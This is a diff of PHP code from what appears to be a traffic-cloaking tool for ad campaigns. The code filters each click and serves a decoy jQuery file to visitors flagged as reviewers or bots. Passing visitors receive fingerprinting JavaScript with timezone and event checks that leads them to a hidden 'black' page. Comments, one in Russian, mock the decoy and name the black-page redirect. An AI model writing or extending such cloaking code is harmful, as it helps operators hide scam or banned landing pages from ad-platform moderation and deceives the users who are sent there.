@@ -20,9 +20,9 @@ header('Content-Type: text/javascript');
 global $db;
 $dbCamp = $db->get_campaign_by_currentpath();
 if ($dbCamp===null){
+    //we couldn't find a campaign for this domain, so we send back js code to redirect to trafficback if any
     $cs = $db->get_common_settings();
-    $c = new Cloaker();
-    $db->add_trafficback_click($c->click_params);
+    $db->add_trafficback_click(Cloaker::get_click_params());
     if (empty($cs['trafficBackUrl']))
         die("NO CAMPAIGN FOR THIS DOMAIN AND TRAFFICBACK NOT SET!");
     else{
@@ -34,19 +34,27 @@ if ($dbCamp===null){
 $c = new Campaign($dbCamp['id'],$dbCamp['settings']);
 $cloaker = new Cloaker($c->filters);
 if($cloaker->is_bad_click()){
+    //if the click doesn't pass the filters, we send back js code of JQuery, haha
     $db->add_white_click($cloaker->click_params, $cloaker->block_reason, $c->campaignId);
     $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
     echo $jq['content'];
     exit();
 }
 
-if ($c->white->jsChecks->enabled) {
-    $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/connect.js'));
-} else {
-    $jsCode = str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__ . '/process.js'));
-    $reason = '';
-    if (!empty($_GET['reason'])) $reason = $_GET['reason'];
-    $jsCode = str_replace('{REASON}', $reason, $jsCode); //пробрасываем js-причину того, что разрешаем переход на блэк
+
+$jsChecks = $c->white->jsChecks;
+if ($jsChecks->enabled) {
+    $jsCode = file_get_contents(__DIR__.'/detect.js');
+    $jsCode = str_replace('{DEBUG}', DebugMethods::on() ? 'true' : 'false', $jsCode);
+    $jsCode = str_replace('{DOMAIN}', get_cloaker_path(), $jsCode);
+    $js_checks_str=	implode('", "', $jsChecks->events);
+    $jsCode = str_replace('{JSCHECKS}', $js_checks_str, $jsCode);
+    $jsCode = str_replace('{JSTIMEOUT}', $jsChecks->timeout, $jsCode);
+    $jsCode = str_replace('{JSTZMIN}', $jsChecks->tzMin, $jsCode);
+    $jsCode = str_replace('{JSTZMAX}', $jsChecks->tzMax, $jsCode);
+}
+else{
+    $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/process.js'));
 }
 
 if (!DebugMethods::on()) {
